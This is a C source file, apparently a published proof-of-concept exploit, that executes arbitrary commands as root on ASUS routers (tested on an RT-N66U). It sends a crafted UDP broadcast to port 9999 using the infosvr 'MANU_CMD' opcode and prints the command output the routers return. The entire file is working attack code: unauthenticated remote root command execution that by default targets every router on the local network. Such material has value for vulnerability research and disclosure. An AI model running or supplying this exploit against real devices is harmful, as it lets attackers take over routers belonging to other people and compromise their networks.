/*
 * asus_cmd.c: Execute commands as root remotely on ASUS routers via UDP broadcast.
 *
 * Tested with ASUS RT-N66U
 *
 * Joshua "jduck" Drake
 */
#define _BSD_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int g_done = 0;


/* START IBOX related stuff =) */

#ifndef  WIN32
#define ULONG   unsigned int 
#define DWORD   unsigned int
#define BYTE    unsigned char
#define PBYTE   unsigned char *
#define WORD    unsigned short
//#define INT     int
#endif //#ifndef  WIN32

//Packet Type Section
#define NET_SERVICE_ID_BASE         (10)
#define NET_SERVICE_ID_LPT_EMU      (NET_SERVICE_ID_BASE + 1)
#define NET_SERVICE_ID_IBOX_INFO    (NET_SERVICE_ID_BASE + 2)

//Packet Type Section
#define NET_PACKET_TYPE_BASE        (20)
#define NET_PACKET_TYPE_CMD         (NET_PACKET_TYPE_BASE + 1)
#define NET_PACKET_TYPE_RES         (NET_PACKET_TYPE_BASE + 2)

enum  NET_CMD_ID
{                               // Decimal      Hexadecimal
    NET_CMD_ID_BASE = 30,       //  30              0x1E
    NET_CMD_ID_GETINFO,         //  31              0x1F
    NET_CMD_ID_GETINFO_EX,      //  32              0x20
    NET_CMD_ID_GETINFO_SITES,   //  33              0x21
    NET_CMD_ID_SETINFO,         //  34              0x22
    NET_CMD_ID_SETSYSTEM,       //  35              0x23
    NET_CMD_ID_GETINFO_PROF,    //  36              0x24
    NET_CMD_ID_SETINFO_PROF,    //  37              0x25
    NET_CMD_ID_CHECK_PASS,      //  38              0x26
#ifdef BTN_SETUP
    NET_CMD_ID_SETKEY_EX,       //  39      0x27
    NET_CMD_ID_QUICKGW_EX,      //  40      0x28
    NET_CMD_ID_EZPROBE,     //  41      0x29
#endif
    NET_CMD_ID_MANU_BASE=50,    //  50      0x32
    NET_CMD_ID_MANU_CMD,        //  51      0x33
    NET_CMD_ID_GETINFO_MANU,    //  52              0x34
    NET_CMD_ID_GETINFO_EX2,     //  53              0x35
    NET_CMD_ID_MAXIMUM
};

#pragma pack(1)

//Packet Header Structure
typedef struct iboxPKT
{
    BYTE        ServiceID;
    BYTE        PacketType;
    WORD        OpCode;
    DWORD       Info; // Or Transaction ID
} IBOX_COMM_PKT_HDR;

typedef struct iboxPKTEx
{
    BYTE        ServiceID;
    BYTE        PacketType;
    WORD        OpCode;
    DWORD       Info; // Or Transaction ID
    BYTE        MacAddress[6];
    BYTE        Password[32];   //NULL terminated string, string length:1~31, cannot be NULL string
} IBOX_COMM_PKT_HDR_EX;

typedef struct iboxPKTExRes
{
    BYTE        ServiceID;
    BYTE        PacketType;
    WORD        OpCode;
    DWORD       Info; // Or Transaction ID
    BYTE        MacAddress[6];
} IBOX_COMM_PKT_RES_EX;

typedef struct iboxPKTCmd
{
    WORD        len;
    BYTE        cmd[420];
} PKT_SYSCMD;       // total 422 bytes

#pragma pack()

/* END IBOX related stuff */


int main(int argc, char *argv[])
{
    int in_sd, out_sd;
    struct sockaddr_in dst, src;
    char buf[4096], inbuf[4096];
    int flag = 1;
    IBOX_COMM_PKT_HDR *phdr;
    PKT_SYSCMD *pcmd;
    char *cmd = "id";
    in_addr_t dst_addr;
   
    dst_addr = INADDR_BROADCAST;

    if (argc > 1)
        cmd = argv[1];

    if (argc > 2)
        dst_addr = inet_addr(argv[2]);

    out_sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (out_sd == -1) {
        perror("outgoing socket");
        return 1;
    }

    in_sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (in_sd == -1) {
        perror("incoming socket");
        return 1;
    }

    if (setsockopt(out_sd, SOL_SOCKET, SO_BROADCAST, &flag, sizeof(flag)) == -1) {
        perror("setsockopt");
        return 1;
    }

    if (setsockopt(in_sd, SOL_SOCKET, SO_BROADCAST, &flag, sizeof(flag)) == -1) {
        perror("setsockopt");
        return 1;
    }

    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = INADDR_ANY;
    dst.sin_port = htons(9999);

    if (bind(in_sd, (struct sockaddr *)&dst, sizeof(dst)) == -1) {
        perror("bind");
        return 1;
    }

    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = dst_addr;
    dst.sin_port = htons(9999);

    memset(buf, 0, sizeof(buf));
    phdr = (IBOX_COMM_PKT_HDR *)buf;

    phdr->ServiceID = NET_SERVICE_ID_IBOX_INFO;
    phdr->PacketType = NET_PACKET_TYPE_CMD;
    //phdr->OpCode = NET_CMD_ID_GETINFO;
    phdr->OpCode = NET_CMD_ID_MANU_CMD;
    phdr->Info = time(NULL);

    memset(buf + sizeof(IBOX_COMM_PKT_HDR), 0x41, 6);

    pcmd = (PKT_SYSCMD *)(buf + sizeof(IBOX_COMM_PKT_HDR_EX));
    pcmd->len = strlen(cmd);
    strcpy((char *)pcmd->cmd, cmd);

    if (sendto(out_sd, buf, 512, 0, (struct sockaddr *)&dst, sizeof(dst)) == -1) {
        perror("sendto");
        return 1;
    }
    printf("[*] sent command: %s\n", cmd);

    //alarm(5);
    while (!g_done) {
        ssize_t nr;
        socklen_t sklen;

        sklen = sizeof(src);
        memset(inbuf, 0, sizeof(inbuf));
        nr = recvfrom(in_sd, inbuf, sizeof(inbuf), 0, (struct sockaddr *)&src, &sklen);
        if (nr == -1) {
            perror("recvfrom");
            return 1;
        }
        printf("[!] received %d bytes from %s:%u\n", nr, inet_ntoa(src.sin_addr), ntohs(src.sin_port));

        phdr = (IBOX_COMM_PKT_HDR *)inbuf;
        if (phdr->PacketType == NET_PACKET_TYPE_CMD) {
            IBOX_COMM_PKT_HDR_EX *pex;

            pex = (IBOX_COMM_PKT_HDR_EX *)inbuf;
            printf("    %02x %02x %04x %08x %02x:%02x:%02x:%02x:%02x:%02x %s\n", pex->ServiceID, pex->PacketType, pex->OpCode, pex->Info,
                    pex->MacAddress[0], pex->MacAddress[1], pex->MacAddress[2], pex->MacAddress[3], pex->MacAddress[4], pex->MacAddress[5],
                    pex->Password);

            pcmd = (PKT_SYSCMD *)(inbuf + sizeof(IBOX_COMM_PKT_HDR_EX));
            printf("    %04x %s\n", pcmd->len, pcmd->cmd);
        }
        else if (phdr->PacketType == NET_PACKET_TYPE_RES) {
            IBOX_COMM_PKT_RES_EX *pex;

            pex = (IBOX_COMM_PKT_RES_EX *)inbuf;
            printf("    %02x %02x %04x %08x %02x:%02x:%02x:%02x:%02x:%02x\n", pex->ServiceID, pex->PacketType, pex->OpCode, pex->Info,
                    pex->MacAddress[0], pex->MacAddress[1], pex->MacAddress[2], pex->MacAddress[3], pex->MacAddress[4], pex->MacAddress[5]);

            pcmd = (PKT_SYSCMD *)(inbuf + sizeof(IBOX_COMM_PKT_RES_EX));
            if (pcmd->len >= sizeof(pcmd->cmd))
                pcmd->len = sizeof(pcmd->cmd)-1;
            pcmd->cmd[pcmd->len] = 0;
            printf("    %04x %s\n", pcmd->len, pcmd->cmd);
        }
        else
            printf("[!] Unknown packet type %02x\n", phdr->PacketType);
    }

    close(out_sd);
    close(in_sd);
    return 0;
}
